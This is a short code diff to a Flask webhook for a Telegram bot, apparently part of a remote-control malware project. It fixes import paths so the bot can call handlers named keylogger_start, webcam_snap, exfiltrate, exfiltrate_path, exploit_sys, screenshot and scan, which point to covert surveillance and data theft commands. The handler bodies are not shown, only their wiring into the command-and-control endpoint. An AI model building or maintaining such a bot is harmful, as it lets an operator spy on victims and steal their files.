@@ -3,8 +3,10 @@ import json
 from flask import Blueprint, request, abort
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler
-from telegram.utils import get_api_keys  # ✅ Import stable
-from telegram.telegram_bot import (       # ✅ Import stable
+
+# ✅ Import corrigé depuis ton propre projet
+from telegram_bot.utils import get_api_keys
+from telegram_bot.telegram_bot import (
     menu, osint, scan, exploit_sys,
     screenshot, keylogger_start,
     webcam_snap, exfiltrate, exfiltrate_path,
@@ -18,7 +20,7 @@ SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")
 
 telegram_webhook = Blueprint("telegram_webhook", __name__)
 
-@telegram_webhook.route("/telegram/webhook", methods=["POST"])  # ✅ Stable
+@telegram_webhook.route("/telegram/webhook", methods=["POST"])
 def handle_webhook():
     # ✅ Vérification du header secret
     header_token = request.headers.get("X-Telegram-Bot-Api-Secret-Token")
